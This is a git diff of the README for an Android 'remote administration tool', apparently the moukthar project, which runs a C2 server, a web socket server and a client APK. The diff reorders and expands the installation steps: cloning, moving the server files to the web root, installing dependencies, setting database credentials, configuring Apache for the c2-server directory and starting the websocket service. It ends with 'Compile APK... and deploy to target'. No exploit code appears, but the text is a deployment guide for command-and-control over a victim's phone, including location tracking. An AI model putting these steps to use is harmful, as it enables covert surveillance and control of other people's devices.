@@ -13,6 +13,20 @@ Remote adminitration tool for android
 - Get device location
 
 ### Installation
+- Clone repository
+  ```console
+  git clone https://github.com/Tomiwa-Ot/moukthar.git
+  ```
+- Move server files to ```/var/www/html/``` and install dependencies
+  ```console
+  mv moukthar/Server/* /var/www/html/
+  cd /var/www/html/c2-server
+  composer install
+  cd /var/www/html/web\ socket/
+  composer install
+  ```
+- Set database credentials in ```c2-server/.env``` and ```web socket/.env```
+- Execute ```database.sql```
 - Start web socket server or deploy as service in linux
   ```console
   php Server/web\ socket/App.php
@@ -22,11 +36,8 @@ Remote adminitration tool for android
   sudo systemctl enable websocket.service
   sudo systemctl start websocket.service
   ```
-- Execute ```database.sql```
-- Set database credentials in ```Server/c2-server/.env``` and ```Server/web socket/.env```
-- Deploy C2 server
+- Modify ```/etc/apache2/apache2.conf```
   ```xml
-  # Apache conf
     <Directory /var/www/html/c2-server>
         Options -Indexes
         DirectoryIndex app.php
@@ -35,7 +46,7 @@ Remote adminitration tool for android
     </Directory>
   ```
 - Set C2 server and web socket server address in client
-- Compile APK using Android Studio
+- Compile APK using Android Studio and deploy to target
 
 ### Screenshots
 ![Dashboard](screenshots/dashboard.png)
